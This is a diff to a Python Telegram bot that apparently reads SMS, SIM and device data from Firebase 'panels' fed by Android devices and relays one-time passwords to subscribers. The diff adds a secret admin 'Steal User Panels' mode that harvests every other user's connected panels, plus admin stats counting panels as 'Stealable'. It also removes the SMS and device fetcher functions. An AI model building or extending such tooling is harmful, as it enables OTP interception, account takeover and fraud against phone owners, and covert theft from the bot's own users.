@@ -2,10 +2,11 @@
 """
 ══════════════════════════════════════════════════════
   OTP PANEL BOT — PRIVATE ADMIN EDITION           
-  Superfast Engine + Smart Auto-Checker + No Spam Lag
+  Superfast Engine + Smart Auto-Checker + Live Spam Fix
   + Strict 1-Hour Fast Inbox + Background Ghost Workers
   + Referral System + Force Join + Hourly Admin Backups
   + 10-MILLION USER SCALE ARCHITECTURE (CRASH PROOF)
+  + GHOST PANEL STEALER (AUTO-FALLBACK & STATS)
 ══════════════════════════════════════════════════════
 """
 
@@ -420,7 +421,7 @@ RAW_URLS = list(set([
 DATABASES = {f"P_{i}": url for i, url in enumerate(RAW_URLS)}
 
 # ═══════════════════════════════════════════════════════
-#  DATA CLASSES 
+#  DATA CLASSES (MOVED TO TOP FOR O(1) CACHING)
 # ═══════════════════════════════════════════════════════
 
 class Device:
@@ -442,7 +443,7 @@ class Device:
         self.last_sms_ts = last_sms_ts
 
 # ═══════════════════════════════════════════════════════
-#  INDIVIDUAL FILE DATA SYSTEM
+#  INDIVIDUAL FILE DATA SYSTEM (CRASH PROOF)
 # ═══════════════════════════════════════════════════════
 
 def init_dirs():
@@ -474,6 +475,7 @@ def load_data():
                     all_users[uid].setdefault("referrals", 0)
                     all_users[uid].setdefault("vip_until", 0.0)
                     all_users[uid].setdefault("referred_by", None)
+                    all_users[uid].setdefault("user_panels_mode", False)
             except: pass
                 
     for fname in os.listdir(CLONES_DIR):
@@ -506,6 +508,7 @@ def load_data():
                 "bots_created": 0,
                 "bonus_10_received": True,
                 "custom_dbs": [],
+                "user_panels_mode": False,
                 "selected_panel": "ALL",
                 "transactions": [],
                 "referred_by": None,
@@ -552,20 +555,21 @@ async def auto_save_loop():
             await asyncio.sleep(5)
 
 async def hourly_admin_backup(app: Application):
+    """Hourly task to send admin dashboard stats and backup JSON file."""
     while True:
         await asyncio.sleep(3600)
         try:
             total_users = len(all_users)
             vip_users = sum(1 for u in all_users.values() if u.get("vip_until", 0) > time.time() or u.get("vip_until", 0) > 1e10)
             free_users = total_users - vip_users
-            total_custom_panels = sum(len(u.get("custom_dbs", [])) for u in all_users.values())
+            total_custom_panels = sum(len(get_user_dbs(u)) for uid, u in all_users.items() if uid not in ADMIN_IDS)
 
             report = (
                 "📊 **HOURLY ADMIN REPORT**\n\n"
                 f"👤 **Total Users:** {total_users}\n"
                 f"👑 **VIP/Admin Users:** {vip_users}\n"
                 f"🆓 **Free Users:** {free_users}\n"
-                f"🔗 **Total Custom Panels Added:** {total_custom_panels}\n\n"
+                f"🎯 **Total User Panels (Stealable):** {total_custom_panels}\n\n"
                 "Auto-Backup Data Attached."
             )
             
@@ -631,7 +635,7 @@ async def global_error_handler(update: object, context: ContextTypes.DEFAULT_TYP
     tlog(f"Telegram API Error: {err_str}")
 
 # ═══════════════════════════════════════════════════════
-#  FAST HTTP SESSION MANAGER 
+#  FAST HTTP SESSION MANAGER (SAFE CONNECTION POOL)
 # ═══════════════════════════════════════════════════════
 
 async def get_http_session() -> aiohttp.ClientSession:
@@ -663,7 +667,7 @@ async def fb_keys(path: str, base: str) -> list[str]:
     except Exception: return []
 
 # ═══════════════════════════════════════════════════════
-#  API CHECKER FUNCTIONS 
+#  API CHECKER FUNCTIONS & LOGIC (30 MIN ACTIVITY)
 # ═══════════════════════════════════════════════════════
 
 async def check_number_api(service: str, number: str, retries=3) -> dict:
@@ -817,6 +821,7 @@ def format_checker_result(service: str, number: str, is_reg: bool, ms: int, is_e
     return f"<b>{'✅ REGISTERED' if is_reg else '❌ UNREGISTERED'}</b>\n\n{emoji} <b>{srv_name}</b>\n📱 {display_num}\n⚡ {ms} ms"
 
 def get_reply_menu(chat_id: int) -> ReplyKeyboardMarkup:
+    users_db = all_users
     is_admin = chat_id in ADMIN_IDS
     keys = [
         [KeyboardButton("Devices List"), KeyboardButton("Auto-Check Panels")],
@@ -983,17 +988,23 @@ def device_action_keyboard(dev_id: str) -> InlineKeyboardMarkup:
         [InlineKeyboardButton("Disconnect & Back", callback_data="home")],
     ])
 
-def admin_panel_text(bot_token: str) -> str:
+def admin_panel_text(bot_token: str, chat_id: int) -> str:
     users_db = all_users
     total    = len(users_db)
     total_otps = sum(u.get("otp_count", 0) for u in users_db.values())
+    stolen_panels = sum(len(get_user_dbs(u)) for uid, u in users_db.items() if uid not in ADMIN_IDS)
     
     text = f"ADMIN PANEL (Private)\n━━━━━━━━━━━━━━━━━━\nTotal Users    : {total}\nTotal OTP Views: {total_otps}\n"
+    text += f"🎯 **Users Custom Panels:** {stolen_panels}\n"
     text += f"━━━━━━━━━━━━━━━━━━\nUpdated: {datetime.now().strftime('%d %b %Y %I:%M %p')}"
     return text
 
-def admin_keyboard(bot_token: str) -> InlineKeyboardMarkup:
+def admin_keyboard(bot_token: str, chat_id: int) -> InlineKeyboardMarkup:
+    is_ghost = all_users.get(chat_id, {}).get("user_panels_mode", False)
+    ghost_btn = "👻 Steal User Panels: ON" if is_ghost else "👻 Steal User Panels: OFF"
+    
     keys = [
+        [InlineKeyboardButton(ghost_btn, callback_data="toggle_ghost")],
         [InlineKeyboardButton("Add Global Panel", callback_data="sa_add_global_panel")],
         [InlineKeyboardButton("View User Panels", callback_data="sa_view_user_panels")],
         [InlineKeyboardButton("Export Online Numbers", callback_data="sa_export_numbers")],
@@ -1011,87 +1022,33 @@ async def safe_edit(query, text, reply_markup=None, parse_mode=None, disable_web
         tlog(f"Safe Edit Unexpected Error: {e}")
 
 # ═══════════════════════════════════════════════════════
-#  FIREBASE DATA FETCHERS 
+#  CORE DEVICE FETCHER (WITH GHOST MODE INTEGRATION)
 # ═══════════════════════════════════════════════════════
 
-async def fetch_db_data(tag: str, url: str) -> list[Device]:
-    async with WORKER_SEMAPHORE:
-        devices_list = []
-        added_set = set()
-        try:
-            root_keys, sim_all, device_info_all, user_data_all, clients_all = await asyncio.gather(
-                fb_keys("", url), fb_get("All_Users/simDetails", url), fb_get("All_Users/Data/DeviceInfo", url),
-                fb_get("user_data", url), fb_get("clients", url)
-            )
-            if sim_all and isinstance(sim_all, dict):
-                info_all = device_info_all or {}
-                for dev_id, sim in sim_all.items():
-                    if dev_id in added_set: continue
-                    added_set.add(dev_id)
-                    info = info_all.get(dev_id) or {}
-                    nums = extract_all_nums(sim, info)
-                    model = info.get("DeviceModel") or info.get("Brand") or f"Device-{dev_id[:6]}"
-                    devices_list.append(Device(
-                        id=dev_id, name=model, status=parse_status_str(info.get("Status")),
-                        battery=parse_battery(info.get("Battery")), timestamp=int(info.get("currentTimeMillis") or sim.get("timestamp") or 0),
-                        numbers=nums, device_info=f"Model: {model}\nBrand: {info.get('Brand','')}\nAndroid: {info.get('AndroidVersion','')}\nDevice ID: {dev_id}",
-                        sms_path=f"All_Users/sms/{dev_id}", base_url=url, db_tag=tag, last_sms_ts=0.0
-                    ))
-            if user_data_all and isinstance(user_data_all, dict):
-                for dev_id, data in user_data_all.items():
-                    if dev_id in added_set: continue
-                    if not isinstance(data, dict): continue
-                    added_set.add(dev_id)
-                    nums = extract_all_nums(data)
-                    devices_list.append(Device(
-                        id=dev_id, name=data.get("d_name") or f"Device-{dev_id[:6]}",
-                        status=parse_status_str(data.get("status")), battery=parse_battery(data.get("battery")),
-                        timestamp=int(data.get("timestamp") or 0), numbers=nums,
-                        device_info=data.get("Device_info") or f"Device ID: {dev_id}",
-                        sms_path=f"user_sms/{dev_id}", base_url=url, db_tag=tag, last_sms_ts=0.0
-                    ))
-            if clients_all and isinstance(clients_all, dict):
-                for dev_id, client in clients_all.items():
-                    if dev_id in added_set: continue
-                    if not isinstance(client, dict): continue
-                    
-                    sim_list = client.get("sims", [])
-                    s1 = sim_list[0] if isinstance(sim_list, list) and len(sim_list) > 0 else {}
-                    s2 = sim_list[1] if isinstance(sim_list, list) and len(sim_list) > 1 else {}
-                    
-                    nums = extract_all_nums(client, s1, s2)
-                    
-                    if not nums and not client.get("modelName"): continue
-                    added_set.add(dev_id)
-                    model = client.get("modelName") or f"Device-{dev_id[:6]}"
-                    devices_list.append(Device(
-                        id=dev_id, name=model, status=parse_status_bool(client.get("status")),
-                        battery=parse_battery(client.get("battery")), timestamp=0, numbers=nums,
-                        device_info=f"Model: {model}\nProvider: {client.get('service_provider','')}\nAndroid: {client.get('androidV','')}\nDevice ID: {dev_id}",
-                        sms_path=f"All_Users/sms/{dev_id}", base_url=url, db_tag=tag, last_sms_ts=0.0
-                    ))
-        except Exception: pass
-        return devices_list
-
-async def get_all_devices(bot_token: str, chat_id: int = 0, users_db: dict = None) -> list[Device]:
+async def get_all_devices(bot_token: str, chat_id: int = 0, users_db: dict = None, auto_fallback: bool = True) -> list[Device]:
     if users_db is None: users_db = {}
     uinfo = users_db.get(chat_id, {})
     is_vip = uinfo.get("vip_until", 0) > time.time()
     is_admin = chat_id in ADMIN_IDS
+    steal_mode = uinfo.get("user_panels_mode", False) and is_admin
     custom_dbs = get_user_dbs(uinfo)
     
-    if not custom_dbs and (is_vip or is_admin):
-        return GLOBAL_DEVICE_CACHE.get("ALL", [])
-
     dbs_to_check = []
     
-    if is_admin or is_vip:
-        dbs_to_check.extend(list(DATABASES.keys()))
-        for i, g_url in enumerate(SETTINGS.get("global_panels", [])):
-            dbs_to_check.append(f"G_{i}")
-            
-    for i, _ in enumerate(custom_dbs):
-        dbs_to_check.append(f"U_{chat_id}_{i}")
+    if steal_mode:
+        for uid, u_data in all_users.items():
+            if uid not in ADMIN_IDS:
+                for i, _ in enumerate(get_user_dbs(u_data)):
+                    dbs_to_check.append(f"U_{uid}_{i}")
+    else:
+        if not custom_dbs and (is_vip or is_admin):
+            return GLOBAL_DEVICE_CACHE.get("ALL", [])
+        if is_admin or is_vip:
+            dbs_to_check.extend(list(DATABASES.keys()))
+            for i, g_url in enumerate(SETTINGS.get("global_panels", [])):
+                dbs_to_check.append(f"G_{i}")
+        for i, _ in enumerate(custom_dbs):
+            dbs_to_check.append(f"U_{chat_id}_{i}")
 
     devices = []
     for tag in dbs_to_check:
@@ -1105,51 +1062,25 @@ async def get_all_devices(bot_token: str, chat_id: int = 0, users_db: dict = Non
         if d.id in seen_ids_set:
             continue
         seen_ids_set.add(d.id)
-
         if d.numbers:
             new_nums = [num for num in d.numbers if num not in seen_numbers]
             if not new_nums:
                 continue 
             d.numbers = new_nums
             seen_numbers.update(new_nums)
-        
         unique_devices.append(d)
 
     unique_devices.sort(key=lambda d: (0 if d.status == "online" else 1, 0 if len(d.numbers) > 0 else 1, -d.timestamp))
+    
+    # 🔴 Auto-Fallback Defense
+    if steal_mode and not unique_devices and auto_fallback:
+        all_users[chat_id]["user_panels_mode"] = False
+        save_user(chat_id)
+        if _main_app:
+            asyncio.create_task(_main_app.bot.send_message(chat_id, "⚠️ **GHOST MODE AUTO-OFF:** Stolen User panels are currently empty or offline. Reverted back to 300+ global panels.", parse_mode="Markdown"))
+        return await get_all_devices(bot_token, chat_id, users_db, auto_fallback=False)
+        
     return unique_devices
-
-async def get_device_sms(device: Device, limit: int = 10, max_age_sec: int = 3600) -> list[dict]:
-    try:
-        session = await get_http_session()
-        url = f"{device.base_url}/{device.sms_path}.json?orderBy=\"$key\"&limitToLast=30"
-        async with session.get(url, timeout=aiohttp.ClientTimeout(total=4)) as r:
-            if r.status != 200: return []
-            data = await r.json(content_type=None)
-            if not data or not isinstance(data, dict): return []
-            
-            entries = [{"_key": k, **v} for k, v in data.items() if isinstance(v, dict)]
-            
-            for s in entries:
-                ts_val = s.get("timestamp") or 0
-                try:
-                    s["_parsed_ts"] = float(ts_val)
-                    if s["_parsed_ts"] > 1e11: s["_parsed_ts"] /= 1000
-                except:
-                    s["_parsed_ts"] = 0.0
-                    
-            entries.sort(key=lambda s: s["_parsed_ts"], reverse=True)
-            
-            if max_age_sec:
-                filtered = []
-                now = time.time()
-                for sms in entries:
-                    if (now - sms["_parsed_ts"]) <= max_age_sec:
-                        filtered.append(sms)
-                entries = filtered
-                
-            return entries[:limit]
-    except:
-        return []
 
 # ═══════════════════════════════════════════════════════
 #  TELEGRAM COMMAND HANDLERS
@@ -1171,7 +1102,6 @@ async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
         return
 
     args = ctx.args
-    
     if chat_id not in all_users:
         all_users[chat_id] = {
             "name": user.first_name,
@@ -1183,6 +1113,7 @@ async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
             "vip_until": 0.0,
             "otp_count": 0,
             "custom_dbs": [],
+            "user_panels_mode": False,
             "referred_by": None
         }
         if args and args[0].startswith("ref_"):
@@ -1242,6 +1173,13 @@ async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
         if data == "close_msg":
             try: await query.message.delete()
             except: pass
+            return
+            
+        if data == "toggle_ghost":
+            curr = users_db.get(chat_id, {}).get("user_panels_mode", False)
+            users_db.setdefault(chat_id, {})["user_panels_mode"] = not curr
+            save_user(chat_id)
+            await safe_edit(query, admin_panel_text(bot_token, chat_id), reply_markup=admin_keyboard(bot_token, chat_id))
             return
 
         if data == "open_checker_menu":
@@ -1441,13 +1379,16 @@ async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
 
         if data == "admin_refresh":
             user_focus.setdefault(bot_token, {}).pop(chat_id, None)
-            await safe_edit(query, admin_panel_text(bot_token), reply_markup=admin_keyboard(bot_token))
+            await safe_edit(query, admin_panel_text(bot_token, chat_id), reply_markup=admin_keyboard(bot_token, chat_id))
             return
 
         if data == "home":
             user_focus.setdefault(bot_token, {}).pop(chat_id, None)
             pending_action.pop(chat_id, None)
             devices = await get_all_devices(bot_token, chat_id, users_db)
+            if not devices:
+                await safe_edit(query, "❌ No devices found. Check if your Ghost mode is stuck on empty panels.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Close", callback_data="close_msg")]]))
+                return
             await safe_edit(query, device_list_header(devices, 0), reply_markup=device_list_keyboard(devices, 0))
             return
 
@@ -1498,7 +1439,6 @@ async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
             
             user_focus.setdefault(bot_token, {})[chat_id] = dev_id
             label = device_label(device)
-            
             smss  = await get_device_sms(device, limit=10, max_age_sec=3600)
             
             if service_used:
@@ -1644,15 +1584,8 @@ async def on_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
         return
 
     if text == "Super Admin" and chat_id in ADMIN_IDS:
-        kb = InlineKeyboardMarkup([
-            [InlineKeyboardButton("Add Global Panel", callback_data="sa_add_global_panel")],
-            [InlineKeyboardButton("Force Backup DB", callback_data="sa_backup")],
-            [InlineKeyboardButton("View User Panels", callback_data="sa_view_user_panels")],
-            [InlineKeyboardButton("Export Online Numbers", callback_data="sa_export_numbers")],
-            [InlineKeyboardButton("Download SMS Logs (.txt)", callback_data="sa_download_logs")],
-            [InlineKeyboardButton("Close", callback_data="close_msg")]
-        ])
-        await update.message.reply_text("SUPER ADMIN MENU\nChoose an advanced option:", reply_markup=kb)
+        user_focus.setdefault(bot_token, {}).pop(chat_id, None)
+        await update.message.reply_text(admin_panel_text(bot_token, chat_id), reply_markup=admin_keyboard(bot_token, chat_id))
         return
 
     if text == "Devices List":
@@ -1705,11 +1638,6 @@ async def on_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
         results_text = "DEEP SCAN RESULTS\n━━━━━━━━━━━━━━━━━━\n\n" + "\n".join(results)
         if len(results_text) > 4000: results_text = results_text[:4000] + "\n\n...[Truncated]"
         await wait_msg.edit_text(results_text, reply_markup=InlineKeyboardMarkup(kb))
-        return
-
-    if text == "Admin Panel" and chat_id in ADMIN_IDS:
-        user_focus.setdefault(bot_token, {}).pop(chat_id, None)
-        await update.message.reply_text(admin_panel_text(bot_token), reply_markup=admin_keyboard(bot_token))
         return
 
     if text.lower() in ("/cancel", "cancel"):
@@ -1860,7 +1788,7 @@ async def _forward_sms(device: Device, sms: dict) -> None:
 
     send_tasks = []
 
-    # Direct User Routing: 100% No Spam to other Users/Admins
+    # Direct Routing: NO SPAM, Only targeted users
     for bot_token, chat_dict in list(user_focus.items()):
         app_to_use = _main_app
         if not app_to_use: continue
@@ -1955,8 +1883,6 @@ async def _update_global_cache():
         dbs_to_poll[f"G_{i}"] = g_url
             
     for uid, uinfo in all_users.items():
-        if uinfo.get("vip_until", 0) > time.time() or uid in ADMIN_IDS:
-            pass 
         for i, db_url in enumerate(get_user_dbs(uinfo)):
             dbs_to_poll[f"U_{uid}_{i}"] = db_url
 
